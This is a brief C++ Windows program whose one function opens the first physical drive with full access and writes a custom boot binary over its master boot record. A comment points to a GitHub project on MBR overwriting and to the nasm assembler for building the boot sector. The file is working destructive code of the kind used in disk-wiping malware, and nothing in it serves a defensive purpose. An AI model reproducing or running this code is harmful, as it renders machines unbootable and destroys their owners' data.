/*
    Ref:
      - Overwrite MBR and replace boot sector with custom bin: https://github.com/sheep-o/Windows-MBR-Overwrite.
      - Download nasm: https://www.nasm.us/pub/nasm/releasebuilds/2.15.05/win64/ And put nasm to path.
*/

#include <Windows.h>

bool overwrite_mbr(void)
{
    HANDLE drive  = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    HANDLE binary = CreateFileW(L"./boot.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    DWORD  size   = GetFileSize(binary, 0); // Must be 512b

    byte* new_mbr = new byte[size];
    DWORD bytes_read;

    ReadFile(binary, new_mbr, size, &bytes_read, 0);
    WriteFile(drive, new_mbr, size, &bytes_read, 0);

    CloseHandle(binary);
    CloseHandle(drive);
}

int main(void)
{
    overwrite_mbr();
    return EXIT_SUCCESS;
}